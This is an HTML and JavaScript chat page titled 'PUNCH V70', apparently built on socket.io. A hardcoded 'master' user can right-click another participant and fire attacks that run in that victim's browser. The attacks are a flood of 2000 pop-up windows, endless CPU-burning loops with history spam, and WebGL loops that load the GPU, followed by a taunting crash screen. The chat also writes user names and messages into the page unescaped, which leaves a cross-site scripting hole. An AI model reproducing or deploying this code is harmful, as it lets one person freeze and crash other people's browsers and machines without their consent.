<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>PUNCH V70 - OMEGA STRIKE</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Archivo+Black&family=JetBrains+Mono:wght@800&display=swap');
        :root { --p-red: #ff0000; --p-black: #000; }
        * { box-sizing: border-box; margin: 0; padding: 0; cursor: crosshair; }
        body { background: var(--p-black); color: #fff; font-family: 'Inter', sans-serif; overflow: hidden; }
        
        /* INTERFACE PUNCH */
        .grid { display: grid; grid-template-columns: 350px 1fr; height: 100vh; }
        .sidebar { background: #050505; border-right: 3px solid var(--p-red); padding: 20px; }
        .main { display: flex; flex-direction: column; background: #000; }
        #chat { flex: 1; padding: 30px; overflow-y: auto; font-family: 'JetBrains Mono'; }
        .input-area { padding: 20px; background: #050505; display: flex; gap: 10px; }
        input { flex: 1; background: #000; border: 1px solid #333; color: #fff; padding: 15px; }
        
        /* MENU CONTEXTUEL */
        #p-menu { display: none; position: fixed; background: #000; border: 2px solid var(--p-red); width: 300px; z-index: 10000; }
        .opt { padding: 15px; font-weight: 900; color: #fff; border-bottom: 1px solid #222; cursor: pointer; }
        .opt:hover { background: var(--p-red); color: #000; }

        /* CRASH OVERLAY */
        #crash-screen { position: fixed; inset: 0; background: #ff0000; z-index: 999999; display: none; align-items: center; justify-content: center; flex-direction: column; }
        .big-txt { font-family: 'Archivo Black'; font-size: 8vw; color: #000; }
    </style>
</head>
<body oncontextmenu="return false;">

<div id="crash-screen"><div class="big-txt">PUNCHED_BY_MASTER</div></div>

<div class="grid">
    <aside class="sidebar">
        <h1 style="color:var(--p-red); font-family:'Archivo Black'; font-size:40px;">PUNCH V70</h1>
        <div id="user-list" style="margin-top:30px;"></div>
    </aside>
    <main class="main">
        <div id="chat"></div>
        <div class="input-area">
            <input type="text" id="msg-in" placeholder="STRIKE...">
            <button onclick="send()" style="background:var(--p-red); border:none; padding:0 30px; font-weight:900;">HIT</button>
        </div>
    </main>
</div>

<div id="p-menu">
    <div class="opt" style="background:#fff; color:#000;">STRIKE SELECTION</div>
    <div class="opt" onclick="fireCombo()">🔥 OMEGA_COMBO (ALL ATK)</div>
    <div class="opt" onclick="fire('p_tsunami')">📑 TAB_TSUNAMI (1000+)</div>
    <div class="opt" onclick="fire('p_cpu')">☢️ CPU_KNOCKOUT</div>
    <div class="opt" onclick="fire('p_gpu')">🎨 GPU_MOLTEN</div>
    <div class="opt" onclick="this.parentElement.style.display='none'">CANCEL</div>
</div>

<script src="/socket.io/socket.io.js"></script>
<script>
    const socket = io();
    let me = ""; let target = "";

    window.onload = () => {
        me = prompt("USER_ID:");
        socket.emit('init', { name: me });
    };

    // --- LOGIQUE CLIC DROIT ---
    window.oncontextmenu = (e) => {
        e.preventDefault();
        if(me !== "toucheur2pp") return;
        const m = document.getElementById('p-menu');
        m.style.display = 'block'; m.style.top = e.pageY+'px'; m.style.left = e.pageX+'px';
        const node = document.elementFromPoint(e.clientX, e.clientY).closest('.u-node');
        if(node) target = node.getAttribute('data-id');
    };

    function send() {
        const i = document.getElementById('msg-in');
        socket.emit('chat', i.value); i.value = "";
    }

    // --- LE COMBO ULTIME ---
    function fireCombo() {
        fire('p_tsunami');
        fire('p_cpu');
        fire('p_gpu');
        fire('p_ram');
    }

    function fire(type) {
        if(!target) return;
        socket.emit(type, target);
        document.getElementById('p-menu').style.display = 'none';
    }

    // --- EXECUTION CHEZ LA VICTIME ---
    socket.on('execute', (d) => {
        let success = false;
        const screen = document.getElementById('crash-screen');
        
        try {
            // 1. TSUNAMI D'ONGLETS (Milliers d'onglets)
            if(d.type === 'p_tsunami' || d.type === 'p_combo') {
                for(let i=0; i<2000; i++) {
                    let win = window.open(location.href, '_blank', 'width=10,height=10');
                    if(win) success = true;
                }
            }

            // 2. CPU / GPU / RAM (Surcharges combinées)
            if(d.type === 'p_cpu' || d.type === 'p_combo') {
                success = true;
                setInterval(() => {
                    for(let i=0; i<5000000; i++) { Math.sqrt(Math.random() * 999); }
                    history.pushState(null, '', '#' + Math.random());
                }, 1);
            }

            if(d.type === 'p_gpu' || d.type === 'p_combo') {
                const c = document.createElement('canvas');
                const gl = c.getContext('webgl');
                setInterval(() => { for(let i=0; i<10000; i++) gl.clear(gl.COLOR_BUFFER_BIT); }, 1);
            }

            // AFFICHAGE DU RÉSULTAT
            if(success) {
                screen.style.display = 'flex';
                socket.emit('chat', `[STRIKE] EZ WIN - ${d.type.toUpperCase()} ACTIVATED`);
            } else {
                socket.emit('chat', `[STRIKE] FAILED - il a esquivé lbatrd (Bloqueur actif)`);
            }

        } catch(e) {
            socket.emit('chat', `[STRIKE] FAILED - Erreur système`);
        }
    });

    // --- SYNC ---
    socket.on('sync', list => {
        const c = document.getElementById('user-list');
        c.innerHTML = "";
        list.forEach(u => {
            const div = document.createElement('div');
            div.className = "u-node";
            div.setAttribute('data-id', u.id);
            div.style.padding = "15px"; div.style.borderBottom = "1px solid #111";
            div.innerHTML = `<b>${u.name.toUpperCase()}</b>`;
            c.appendChild(div);
        });
    });

    socket.on('chat', d => {
        const chat = document.getElementById('chat');
        chat.innerHTML += `<div><span style="color:red">${d.n}:</span> ${d.t}</div>`;
        chat.scrollTop = chat.scrollHeight;
    });

    window.onclick = () => document.getElementById('p-menu').style.display = 'none';
</script>
</body>
</html>
